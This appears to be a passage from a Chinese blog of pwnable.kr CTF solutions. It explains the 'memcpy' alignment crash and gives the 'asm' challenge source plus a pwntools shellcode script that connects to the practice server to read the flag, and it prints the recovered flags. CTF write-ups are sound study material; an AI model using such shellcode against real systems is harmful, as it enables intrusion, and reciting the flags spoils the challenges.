+“movdqa 32(%0), %%xmm2\n”<br>
+“movdqa 48(%0), %%xmm3\n”<br>
+“movntps %%xmm0, (%1)\n”<br>
+“movntps %%xmm1, 16(%1)\n”<br>
+“movntps %%xmm2, 32(%1)\n”<br>
+“movntps %%xmm3, 48(%1)\n”<br>
+::“r”(src),“r”(dest):“memory”);<br>
+dest += 64;<br>
+src += 64;<br>
+}<br>
+}</p>
+<pre><code>// byte-to-byte slow copy
+if(len) slow_memcpy(dest, src, len);
+return dest;
+</code></pre>
+<p>}</p>
+<p>int main(void){</p>
+<pre><code>setvbuf(stdout, 0, _IONBF, 0);
+setvbuf(stdin, 0, _IOLBF, 0);
+
+printf(&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;);
+printf(&quot;The assignment is simple.\n&quot;);
+
+printf(&quot;-----------------------------------------------------\n&quot;);
+printf(&quot;- What is the best implementation of memcpy?        -\n&quot;);
+printf(&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;);
+printf(&quot;- 2. compare them with various size of data         -\n&quot;);
+printf(&quot;- 3. conclude your experiment and submit report     -\n&quot;);
+printf(&quot;-----------------------------------------------------\n&quot;);
+
+printf(&quot;This time, just help me out with my experiment and get flag\n&quot;);
+printf(&quot;No fancy hacking, I promise :D\n&quot;);
+
+unsigned long long t1, t2;
+int e;
+char* src;
+char* dest;
+unsigned int low, high;
+unsigned int size;
+// allocate memory
+char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+size_t sizes[10];
+int i=0;
+
+// setup experiment parameters
+for(e=4; e&lt;14; e++)&#123;	// 2^13 = 8K
+	low = pow(2,e-1);
+	high = pow(2,e);
+	printf(&quot;specify the memcpy amount between %d ~ %d:&quot;, low, high);
+	scanf(&quot;%d&quot;, &amp;size);
+	if( size &lt; low || size &gt; high )&#123;
+		printf(&quot;don't mess with the experiment.\n&quot;);
+		exit(0);
+	&#125;
+	sizes[i++] = size;
+&#125;
+
+sleep(1);
+printf(&quot;ok, lets run the experiment with your configuration\n&quot;);
+sleep(1);
+
+// run experiment
+for(i=0; i&lt;10; i++)&#123;
+	size = sizes[i];
+	printf(&quot;experiment %d:memcpy with buffer size %d\n&quot;, i+1, size);
+	dest = malloc( size );
+
+	memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
+	t1 = rdtsc();
+	slow_memcpy(dest, src, size);		// byte-to-byte memcpy
+	t2 = rdtsc();
+	printf(&quot;ellapsed CPU cycles for slow_memcpy:%llu\n&quot;, t2-t1);
+
+	memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
+	t1 = rdtsc();
+	fast_memcpy(dest, src, size);		// block-to-block memcpy
+	t2 = rdtsc();
+	printf(&quot;ellapsed CPU cycles for fast_memcpy:%llu\n&quot;, t2-t1);
+	printf(&quot;\n&quot;);
+&#125;
+
+printf(&quot;thanks for helping my experiment!\n&quot;);
+printf(&quot;flag:----- erased in this source code -----\n&quot;);
+return 0;
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-17"><a class="markdownIt-Anchor" href="#题目解析-17">#</a> 题目解析</h3>
+<p>这个程序的作用就是测试自己实现的两个函数 <code>slow_memcpy</code>  和 <code>fast_memcpy</code>  的速度， <code>slow_memcpy</code>  使用的是逐字节赋值， <code>fast_memcpy</code>  就比较麻烦了，使用的是内嵌汇编 <code>movdqa</code>  和 <code>movntps</code>  指令，当程序测试完之后就会直接输出 flag。</p>
+<p>直接运行程序，</p>
+<p>specify the memcpy amount between 8 ~ 16:8<br>
+specify the memcpy amount between 16 ~ 32:16<br>
+specify the memcpy amount between 32 ~ 64:32<br>
+specify the memcpy amount between 64 ~ 128:64<br>
+specify the memcpy amount between 128 ~ 256:128<br>
+specify the memcpy amount between 256 ~ 512:256<br>
+specify the memcpy amount between 512 ~ 1024:512<br>
+specify the memcpy amount between 1024 ~ 2048:1024<br>
+specify the memcpy amount between 2048 ~ 4096:2048<br>
+specify the memcpy amount between 4096 ~ 8192:4096<br>
+ok, lets run the experiment with your configuration<br>
+experiment 1:memcpy with buffer size 8<br>
+ellapsed CPU cycles for slow_memcpy:2162<br>
+ellapsed CPU cycles for fast_memcpy:244</p>
+<p>experiment 2:memcpy with buffer size 16<br>
+ellapsed CPU cycles for slow_memcpy:358<br>
+ellapsed CPU cycles for fast_memcpy:254</p>
+<p>experiment 3:memcpy with buffer size 32<br>
+ellapsed CPU cycles for slow_memcpy:382<br>
+ellapsed CPU cycles for fast_memcpy:484</p>
+<p>experiment 4:memcpy with buffer size 64<br>
+ellapsed CPU cycles for slow_memcpy:618<br>
+ellapsed CPU cycles for fast_memcpy:168</p>
+<p>experiment 5:memcpy with buffer size 128<br>
+ellapsed CPU cycles for slow_memcpy:1250</p>
+<p>并没有输出 flag，而是到某一个环节就停下来了，使用 ida 调试下，程序在 <code>_mm_stream_ps(a1, (__m128)_mm_load_si128(a2));</code> ，也就是 <code>&quot;movntps %%xmm0, (%1)\n&quot;</code>  的地方出错了，查了下 <code>movntps</code> ，其中有一句描述：</p>
+<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.</p>
+<p>“如果源或目的操作数是一个内存引用，则它必须满足 16 字节对齐。否则，会造成一般保护错误。”</p>
+<p>从源码中可以看到，前三次的赋值操作其实都是由 <code>slow_memcpy</code>  来完成的，所以没有出问题，那么为什么后面的字节就无法对齐</p>
+<p>首先 src 是通过 <code>mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</code>  来得到地址的，这个地址一定是 16 字节对齐的（<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDIyNTk0OTUvZG9lcy1tbWFwLXJldHVybi1hbGlnbmVkLXBvaW50ZXItdmFsdWVz">原因</span>）。而 dest 则是由 malloc 来分配的地址，并且 malloc 返回的地址总是 8 字节对齐，所以就有可能导致地址不是 16 字节对齐。</p>
+<p>但是输入的数据为 128 时，但是程序还是崩溃了</p>
+<p>原因在于堆上分配空间时，除了用户的数据，还有 4 字节的 chunk 信息，再加上 malloc 的 8 字节对齐，所以就无法 16 字节对齐。</p>
+<p>那么接下来输入的数据只需要加上 8 或者 12 就可以满足 16 字节对齐。</p>
+<h2 id="memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple"><a class="markdownIt-Anchor" href="#memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple">#</a> memcpy@prowl:~$ nc 0 9022<br>
+Hey, I have a boring assignment for CS class… 😦<br>
+The assignment is simple.</h2>
+<ul>
+<li>What is the best implementation of memcpy?        -</li>
+<li>
+<ol>
+<li>implement your own slow/fast version of memcpy -</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>compare them with various size of data         -</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>conclude your experiment and submit report     -</li>
+</ol>
+</li>
+</ul>
+<hr>
+<p>This time, just help me out with my experiment and get flag<br>
+No fancy hacking, I promise 😄<br>
+specify the memcpy amount between 8 ~ 16:8<br>
+specify the memcpy amount between 16 ~ 32:16<br>
+specify the memcpy amount between 32 ~ 64:32<br>
+specify the memcpy amount between 64 ~ 128:72<br>
+specify the memcpy amount between 128 ~ 256:136<br>
+specify the memcpy amount between 256 ~ 512:264<br>
+specify the memcpy amount between 512 ~ 1024:520<br>
+specify the memcpy amount between 1024 ~ 2048:1032<br>
+specify the memcpy amount between 2048 ~ 4096:2056<br>
+specify the memcpy amount between 4096 ~ 8192:4104<br>
+ok, lets run the experiment with your configuration<br>
+experiment 1:memcpy with buffer size 8<br>
+ellapsed CPU cycles for slow_memcpy:2120<br>
+ellapsed CPU cycles for fast_memcpy:170</p>
+<p>experiment 2:memcpy with buffer size 16<br>
+ellapsed CPU cycles for slow_memcpy:234<br>
+ellapsed CPU cycles for fast_memcpy:208</p>
+<p>experiment 3:memcpy with buffer size 32<br>
+ellapsed CPU cycles for slow_memcpy:438<br>
+ellapsed CPU cycles for fast_memcpy:340</p>
+<p>experiment 4:memcpy with buffer size 72<br>
+ellapsed CPU cycles for slow_memcpy:600<br>
+ellapsed CPU cycles for fast_memcpy:212</p>
+<p>experiment 5:memcpy with buffer size 136<br>
+ellapsed CPU cycles for slow_memcpy:1208<br>
+ellapsed CPU cycles for fast_memcpy:136</p>
+<p>experiment 6:memcpy with buffer size 264<br>
+ellapsed CPU cycles for slow_memcpy:1684<br>
+ellapsed CPU cycles for fast_memcpy:166</p>
+<p>experiment 7:memcpy with buffer size 520<br>
+ellapsed CPU cycles for slow_memcpy:3700<br>
+ellapsed CPU cycles for fast_memcpy:232</p>
+<p>experiment 8:memcpy with buffer size 1032<br>
+ellapsed CPU cycles for slow_memcpy:7130<br>
+ellapsed CPU cycles for fast_memcpy:400</p>
+<p>experiment 9:memcpy with buffer size 2056<br>
+ellapsed CPU cycles for slow_memcpy:13596<br>
+ellapsed CPU cycles for fast_memcpy:774</p>
+<p>experiment 10:memcpy with buffer size 4104<br>
+ellapsed CPU cycles for slow_memcpy:29864<br>
+ellapsed CPU cycles for fast_memcpy:1486</p>
+<p>thanks for helping my experiment!<br>
+flag:1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</p>
+<h2 id="asm"><a class="markdownIt-Anchor" href="#asm">#</a> asm</h2>
+<h3 id="题目描述-18"><a class="markdownIt-Anchor" href="#题目描述-18">#</a> 题目描述</h3>
+<p>#include &lt;stdio.h&gt;<br>
+#include &lt;string.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+#include &lt;sys/mman.h&gt;<br>
+#include &lt;seccomp.h&gt;<br>
+#include &lt;sys/prctl.h&gt;<br>
+#include &lt;fcntl.h&gt;<br>
+#include &lt;unistd.h&gt;</p>
+<p>#define LENGTH 128</p>
+<p>void sandbox(){<br>
+scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);<br>
+if (ctx == NULL) {<br>
+printf(“seccomp error\n”);<br>
+exit(0);<br>
+}</p>
+<pre><code>seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+
+if (seccomp_load(ctx) &lt; 0)&#123;
+	seccomp_release(ctx);
+	printf(&quot;seccomp error\n&quot;);
+	exit(0);
+&#125;
+seccomp_release(ctx);
+</code></pre>
+<p>}</p>
+<p>char stub[] = “\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff”;<br>
+unsigned char filter[256];<br>
+int main(int argc, char* argv[]){</p>
+<pre><code>setvbuf(stdout, 0, _IONBF, 0);
+setvbuf(stdin, 0, _IOLBF, 0);
+
+printf(&quot;Welcome to shellcoding practice challenge.\n&quot;);
+printf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;);
+printf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;);
+printf(&quot;If this does not challenge you. you should play 'asg' challenge :)\n&quot;);
+
+char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+memset(sh, 0x90, 0x1000);
+memcpy(sh, stub, strlen(stub));
+
+int offset = sizeof(stub);
+printf(&quot;give me your x64 shellcode: &quot;);
+read(0, sh+offset, 1000);
+
+alarm(10);
+chroot(&quot;/home/asm_pwn&quot;);	// you are in chroot jail. so you can't use symlink in /tmp
+sandbox();
+((void (*)(void))sh)();
+return 0;
+</code></pre>
+<p>}</p>
+<h3 id="题目解析-18"><a class="markdownIt-Anchor" href="#题目解析-18">#</a> 题目解析</h3>
+<p>首先程序分配一块内存区域，然后用 0x90 将其填充，接着将 stub 复制进去。</p>
+<p>其中 stub 的内容利用 pwntools 的 asm 模块翻译过来就是清空所有寄存器</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>print disasm(&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;)<br>
+0:   48                      dec    eax<br>
+1:   31 c0                   xor    eax,eax<br>
+3:   48                      dec    eax<br>
+4:   31 db                   xor    ebx,ebx<br>
+6:   48                      dec    eax<br>
+7:   31 c9                   xor    ecx,ecx<br>
+9:   48                      dec    eax<br>
+a:   31 d2                   xor    edx,edx<br>
+c:   48                      dec    eax<br>
+d:   31 f6                   xor    esi,esi<br>
+f:   48                      dec    eax<br>
+10:   31 ff                   xor    edi,edi<br>
+12:   48                      dec    eax<br>
+13:   31 ed                   xor    ebp,ebp<br>
+15:   4d                      dec    ebp<br>
+16:   31 c0                   xor    eax,eax<br>
+18:   4d                      dec    ebp<br>
+19:   31 c9                   xor    ecx,ecx<br>
+1b:   4d                      dec    ebp<br>
+1c:   31 d2                   xor    edx,edx<br>
+1e:   4d                      dec    ebp<br>
+1f:   31 db                   xor    ebx,ebx<br>
+21:   4d                      dec    ebp<br>
+22:   31 e4                   xor    esp,esp<br>
+24:   4d                      dec    ebp<br>
+25:   31 ed                   xor    ebp,ebp<br>
+27:   4d                      dec    ebp<br>
+28:   31 f6                   xor    esi,esi<br>
+2a:   4d                      dec    ebp<br>
+2b:   31 ff                   xor    edi,edi</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>接着读取用户输入的数据到内存中。</p>
+<p>重点在这个沙箱函数，通过<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2VjY29tcA=="> seccomp</span> 建立了一些规则，限制了可以使用的系统调用，只能够使用 <code>read</code> 、 <code>open</code> 、 <code>write</code> 、 <code>exit</code> 、 <code>exit_group</code> 。</p>
+<p>但有这几个函数就足以构造出 shellcode 去读取 flag，利用 pwntools 的 shellcraft 模块和 asm 模块很轻松就可以完成。</p>
+<p>汇编语言函数返回值一般是在 eax (rax) 中，所以 open 之后 read 的 fd 参数填 rax</p>
+<p>from pwn import *</p>
+<p>r=ssh(‘asm’,‘<span class="exturl" data-url="aHR0cDovL3B3bmFibGUua3I=">pwnable.kr</span>’,2222,‘guest’)<br>
+p=r.connect_remote(‘localhost’,9026)<br>
+context(arch=‘amd64’, os=‘linux’)</p>
+<p>payload=&quot;&quot;<br>
+payload=shellcraft.pushstr(‘this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong’)<br>
+payload+=shellcraft.open(‘rsp’,0,0)<br>
+payload+=shellcraft.read(‘rax’,‘rsp’,100)<br>
+payload+=shellcraft.write(1,‘rsp’,100)</p>
+<p>print p.recvuntil('shellcode: ')</p>
+<p>p.sendline(asm(payload))</p>
+<p>print p.recvline()</p>
+<p>后来测试了下，也可以直接 open 打开</p>
+<p>payload+=shellcraft.open(‘this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong’)</p>
+
+      <div class="tags">
+          <a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a>
+          <a href="/tags/PWN/" rel="tag"><i class="ic i-tag"></i> PWN</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="a1oyss 微信支付">
+        <p>微信支付</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>a1oyss <i class="ic i-at"><em>@</em></i>a1oyss
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://a1oyss.github.io/CTF/Pwnable%E9%A2%98%E8%A7%A3/" title="Pwnable题解">https://a1oyss.github.io/CTF/Pwnable题解/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/%E6%9D%82%E8%AE%B0/VScode+XDebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95ThinkPHP%20RCE/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;11&#x2F;29&#x2F;wVzJrU9Hjn2mbgo.jpg" title="VScode+XDebug远程调试ThinkPHP RCE">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 杂记</span>
+  <h3>VScode+XDebug远程调试ThinkPHP RCE</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/BUG/Hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E5%A4%B1%E8%B4%A5/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;11&#x2F;29&#x2F;o48DpbILlyrJ6OU.jpg" title="Hexo图片显示失败">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> BUG</span>
+  <h3>Hexo图片显示失败</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#toddlers-bottle"><span class="toc-number">1.</span> <span class="toc-text"> Toddler’s Bottle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">1.1.</span> <span class="toc-text"> fd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#collision"><span class="toc-number">1.2.</span> <span class="toc-text"> collision</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-2"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">1.3.</span> <span class="toc-text"> bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-3"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.4.</span> <span class="toc-text"> flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-4"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">1.5.</span> <span class="toc-text"> passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-5"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">1.6.</span> <span class="toc-text"> random</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-6"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-6"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input2"><span class="toc-number">1.7.</span> <span class="toc-text"> input2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-7"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-7"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 题目解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-1-argv"><span class="toc-number">1.7.2.1.</span> <span class="toc-text"> stage 1 argv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-2-stdio"><span class="toc-number">1.7.2.2.</span> <span class="toc-text"> stage 2 stdio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-3-env"><span class="toc-number">1.7.2.3.</span> <span class="toc-text"> stage 3 env</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-4-file"><span class="toc-number">1.7.2.4.</span> <span class="toc-text"> stage 4 file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stage-5-network"><span class="toc-number">1.7.2.5.</span> <span class="toc-text"> stage 5 network</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-1-process"><span class="toc-number">2.</span> <span class="toc-text"> stage 1 process</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-2-stdio-2"><span class="toc-number">3.</span> <span class="toc-text"> stage 2 stdio</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-3-env-2"><span class="toc-number">4.</span> <span class="toc-text"> stage 3 env</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-4-file-2"><span class="toc-number">5.</span> <span class="toc-text"> stage 4 file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stage-5-network-2"><span class="toc-number">6.</span> <span class="toc-text"> stage 5 network</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#leg"><span class="toc-number">6.1.</span> <span class="toc-text"> leg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-8"><span class="toc-number">6.1.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-8"><span class="toc-number">6.1.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mistake"><span class="toc-number">6.2.</span> <span class="toc-text"> mistake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-9"><span class="toc-number">6.2.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-9"><span class="toc-number">6.2.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock"><span class="toc-number">6.3.</span> <span class="toc-text"> shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-10"><span class="toc-number">6.3.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-10"><span class="toc-number">6.3.2.</span> <span class="toc-text"> 题目解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.3.2.1.</span> <span class="toc-text"> 参考文章</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#coin1"><span class="toc-number">6.4.</span> <span class="toc-text"> coin1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-11"><span class="toc-number">6.4.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-11"><span class="toc-number">6.4.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blackjack"><span class="toc-number">6.5.</span> <span class="toc-text"> blackjack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-12"><span class="toc-number">6.5.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-12"><span class="toc-number">6.5.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lotto"><span class="toc-number">6.6.</span> <span class="toc-text"> lotto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-13"><span class="toc-number">6.6.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-13"><span class="toc-number">6.6.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd1"><span class="toc-number">6.7.</span> <span class="toc-text"> cmd1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-14"><span class="toc-number">6.7.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-14"><span class="toc-number">6.7.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd2"><span class="toc-number">6.8.</span> <span class="toc-text"> cmd2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-15"><span class="toc-number">6.8.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-15"><span class="toc-number">6.8.2.</span> <span class="toc-text"> 题目解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uaf"><span class="toc-number">6.9.</span> <span class="toc-text"> uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-16"><span class="toc-number">6.9.1.</span> <span class="toc-text"> 题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 